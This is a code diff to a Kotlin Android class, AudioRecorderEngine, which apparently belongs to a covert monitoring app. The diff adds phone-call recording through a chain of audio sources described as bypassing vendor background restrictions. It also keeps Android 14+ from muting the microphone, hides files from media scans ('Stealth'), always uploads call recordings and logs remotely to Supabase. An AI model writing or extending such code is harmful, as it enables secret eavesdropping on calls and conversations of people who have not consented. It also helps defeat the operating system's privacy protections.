@@ -24,7 +24,7 @@ import java.util.Date
 import java.util.Locale
 
 /**
- * AudioRecorderEngine v17
+ * AudioRecorderEngine v18
  *
  * Features:
  * ─────────────────────────────────────────────────────────────────────
@@ -34,11 +34,13 @@ import java.util.Locale
  *     A window of VAD_WINDOW_SIZE samples is evaluated.
  *     If the ratio of "active" samples (above ENERGY_THRESHOLD) is below
  *     MIN_ACTIVE_RATIO, the recording is classified as silent → discarded.
- * • Audio source priority:
+ * • Audio source priority (ambient recording):
  *     VOICE_COMMUNICATION → VOICE_RECOGNITION → MIC
- *     (VOICE_COMMUNICATION captures both earpiece + mic — works with
- *      Bluetooth A2DP and wired headsets on most OEMs)
- * • Output: .m4a (AAC/MPEG-4) @ 16 kHz / 32 kbps ≈ 14 KB/min
+ * • Audio source priority (call recording):
+ *     VOICE_RECOGNITION → VOICE_COMMUNICATION → MIC → VOICE_CALL (Q+) → DEFAULT
+ *     (DEFAULT is the ultimate fallback when all named sources are blocked)
+ * • Ambient output : .m4a (AAC/MPEG-4) @ 16 kHz / 32 kbps ≈ 240 KB/min
+ * • Call output    : .m4a (AAC/MPEG-4) @ 44.1 kHz / 64 kbps (higher fidelity)
  * • Stealth: files written to cacheDir (excluded from media scans)
  * ─────────────────────────────────────────────────────────────────────
  */
@@ -207,22 +209,28 @@ class AudioRecorderEngine(private val context: Context) {
 
         val sourceChain = buildList {
             add(MediaRecorder.AudioSource.VOICE_RECOGNITION)    // Priority 1: Raw mic / Samsung & Xiaomi background bypass
-            add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // Priority 2: Speech / VoIP communication source
+            add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // Priority 2: Speech / VoIP — exempt from background silencing
             add(MediaRecorder.AudioSource.MIC)                  // Priority 3: Standard Mic
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                add(MediaRecorder.AudioSource.VOICE_CALL)
+                add(MediaRecorder.AudioSource.VOICE_CALL)       // Priority 4: Voice call capture (restricted on Android 10+)
             }
+            add(MediaRecorder.AudioSource.DEFAULT)              // Priority 5: System default — ultimate fallback
         }
 
-        MonitoringForegroundService.getInstance()?.upgradeToMicType()
-        // تأخير قصير لتمكين نظام Android من تسجيل نوع الخدمة
-        Thread.sleep(200)
+        // ── Upgrade Foreground Service to MICROPHONE type BEFORE start() ──────
+        // This MUST happen before recorder.start() on Android 14+ to prevent silent muting.
+        // upgradeToMicType() is called regardless of Accessibility Service status for call recordings.
+        MonitoringForegroundService.getInstance()?.upgradeToMicTypeForCall()
+        // Non-blocking wait via coroutine — let OS register the foreground service type
+        // Note: startCallRecording() is synchronous; use scope.launch wrapper at call-sites
+        // for long paths. Here we use runBlocking-safe sleep only for the 200ms OS settling.
+        try { Thread.sleep(200) } catch (_: InterruptedException) { Thread.currentThread().interrupt() }
 
         for (src in sourceChain) {
             try {
                 amplitudeWindow.clear()
                 Log.i(TAG, "🎙️ Attempting to start call recorder with source $src -> ${file.name}")
-                val rec = buildRecorder(file, src)
+                val rec = buildRecorder(file, src, isCallRecording = true)
                 rec.prepare()
                 rec.start()
                 recorder = rec
@@ -389,22 +397,33 @@ class AudioRecorderEngine(private val context: Context) {
     private suspend fun processResult(hasSpeech: Boolean) = withContext(Dispatchers.IO) {
         val file = currentFile ?: return@withContext
 
-        if (!file.exists() || file.length() < MIN_FILE_BYTES) {
+        val fileSizeBytes = file.length()
+        val fileSizeKb    = fileSizeBytes / 1024
+        val peakAmplitude = amplitudeWindow.maxOrNull() ?: 0
+        val activeFrames  = amplitudeWindow.count { it >= ENERGY_THRESHOLD }
+        Log.i(TAG, "📊 [AudioDiag] file=${file.name} size=${fileSizeBytes}B (${fileSizeKb}KB) " +
+                   "peak=$peakAmplitude activeFrames=$activeFrames/${amplitudeWindow.size} hasSpeech=$hasSpeech")
+
+        if (!file.exists() || fileSizeBytes < MIN_FILE_BYTES) {
             file.delete()
-            Log.d(TAG, "Discarded: file too small (${file.length()} B)")
+            Log.w(TAG, "⚠️ Discarded: file too small (${fileSizeBytes} B) — likely empty header/silent stream")
+            SupabaseManager.getInstance()
+                .logRemote(activeContext, TAG, "WARN",
+                    "⚠️ Recording discarded (empty/header-only): ${file.name} — ${fileSizeBytes}B, peak=$peakAmplitude")
             return@withContext
         }
 
         val isCall = file.name.startsWith("call_")
         if (!isCall && !hasSpeech) {
             file.delete()
-            Log.d(TAG, "Discarded: VAD classified as silent")
+            Log.d(TAG, "Discarded: VAD classified as silent (peak=$peakAmplitude, activeFrames=$activeFrames)")
             SupabaseManager.getInstance()
-                .logRemote(activeContext, TAG, "DEBUG", "Silent recording discarded")
+                .logRemote(activeContext, TAG, "DEBUG", "Silent recording discarded (peak=$peakAmplitude)")
             return@withContext
         }
 
-        // Has speech → upload
+        // Has speech (or it's a call file — always upload) → upload
+        Log.i(TAG, "📤 Uploading ${file.name} — isCall=$isCall size=${fileSizeKb}KB peak=$peakAmplitude")
         uploadFile(file)
     }
 
@@ -536,7 +555,20 @@ class AudioRecorderEngine(private val context: Context) {
 
     // ── MediaRecorder factory ─────────────────────────────────────────────────
 
-    private fun buildRecorder(outputFile: File, audioSource: Int): MediaRecorder {
+    /**
+     * Builds a configured [MediaRecorder] for audio capture.
+     *
+     * @param outputFile      Destination .m4a file.
+     * @param audioSource     [MediaRecorder.AudioSource] constant to use.
+     * @param isCallRecording When true, uses higher-quality settings (44.1 kHz / 64 kbps)
+     *                        suitable for telephony capture. Ambient recordings use
+     *                        16 kHz / 32 kbps for bandwidth efficiency.
+     */
+    private fun buildRecorder(
+        outputFile: File,
+        audioSource: Int,
+        isCallRecording: Boolean = false
+    ): MediaRecorder {
         val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
             MediaRecorder(activeContext)
         else
@@ -545,9 +577,22 @@ class AudioRecorderEngine(private val context: Context) {
         rec.setAudioSource(audioSource)
         rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
         rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-        rec.setAudioChannels(1)              // 1 Channel = Mono (Voice optimized)
-        rec.setAudioSamplingRate(16_000)     // 16 kHz — optimal human speech sampling
-        rec.setAudioEncodingBitRate(32_000)  // 32 kbps — high compression, clear voice (≈240 KB/min)
+        rec.setAudioChannels(1)   // Mono — optimised for voice
+
+        if (isCallRecording) {
+            // Higher fidelity for telephony capture:
+            // 44.1 kHz captures the full telephone audio band (300 Hz – 3.4 kHz) with headroom.
+            // 64 kbps keeps the file small while avoiding the compression artefacts that
+            // cause "silent" or distorted call recordings at lower bitrates.
+            rec.setAudioSamplingRate(44_100)
+            rec.setAudioEncodingBitRate(64_000)
+            Log.d(TAG, "buildRecorder: call-quality params → 44.1kHz / 64kbps (source=$audioSource)")
+        } else {
+            // Ambient background recording — optimised for size:
+            rec.setAudioSamplingRate(16_000)
+            rec.setAudioEncodingBitRate(32_000)
+        }
+
         rec.setOutputFile(outputFile.absolutePath)
         return rec
     }
